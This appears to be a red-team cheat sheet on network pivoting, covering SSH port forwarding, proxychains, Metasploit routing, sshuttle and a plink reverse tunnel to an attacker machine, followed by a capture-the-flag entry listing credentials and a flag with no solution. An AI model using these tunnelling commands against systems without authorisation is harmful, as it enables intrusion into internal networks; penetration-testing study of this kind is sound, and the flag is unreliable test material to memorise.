# Pivoting

> Pivoting is the act of accessing different subnet and compromising the network.

Penetration testers often cross logical network boundaries to gain access to a client's critical infrastructure. Common scenarios include evolving the attack into the internal network after successfully breaching the perimeter or gaining access to initially unreachable network segments after compromising hosts within the organization. 

Pivoting is a set of techniques used in Red Team/Pentest deployments that use attacker-controlled hosts as logical network hops to increase network visibility.
 
## SSH port forwarding

Managed to find credentials to the SSH service running on the host? Nice! Connect to the host as follows:
```
ssh username@host -D 1080
```

This will spawn a socks server on the attacker’s side (ssh-client side).

It is also possible to forward one specific port to a specific host. Let’s say you need to access an SMB share in the internal network on host 192.168.1.1.
```
ssh username@host -L 445:192.168.1.1:445
```

This way a port 445 will be opened on the attacker’s side. Note, that to bind privileged ports (such as 445) you will need root privileges on your machine.

**SOCKS with proxychains**

If your program doesn’t use raw sockets (nmap syn-scan, for example) then most probably you can use _proxychains_ to force your program though the socks proxy. Edit proxy server in `/etc/proxychains.conf`:
```
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 3128
```

All ready. Just prepend _proxychains_ to you favorite pwn tool:

`proxychains program_name`

Using impacket’s psexec.py with proxychains

## Metasploit Pivoting 
1. Add Routing First
   - run autoroute –s network/subnet
2. To Check the added routes
   - run autoroute –p 
3. Port Forwarding
   - portfwd add –l 88 –p 80 –r target_ip
   - Firefox -> localhost:88

## SSH Shuttle
   - Poor man VPN 
   - Proxy the traffic using compromised machine
   - sudo apt-get install sshuttle
   - sshuttle –r root@ipaddress 0.0.0.0/0 -vv

### Pivoting from windows host using Plink:

After exploiting a Windows host, run this from the command line: This creates a tunnel back to the attacking machine It will forward all traffic on the attacking machine, port 4444 to Port 80 on the IP specified.
```
plink.exe -ssh root@YOUR_ATTACKING_MACHINE -R 127.0.0.1:4444:11.1.2.244:80
```

Additional Resources for pivoting tools
   - Proxychains: [https://github.com/haad/proxychains](https://github.com/haad/proxychains)
   - Proxychains-ng: [https://github.com/rofl0r/proxychains-ng](https://github.com/rofl0r/proxychains-ng)
   - SSHuttle : [https://github.com/sshuttle/sshuttle](https://github.com/sshuttle/sshuttle)
   - SSHuttle Documentation: [https://sshuttle.readthedocs.io/en/stable/](https://sshuttle.readthedocs.io/en/stable/)

-----------------------------------------------------------------------------
# Writeups
## Challenge Name : onehop

Challenge Category : Machines

Challenge Level : Medium

Challenge Description : compromise the machine and get root.txt

your entry point on 3.127.39.160 on port 20022 

username: cybertalents

pass: cybertalents

**Solution**

> Flag : c288f114adda37a242a5efb1c2637dc2
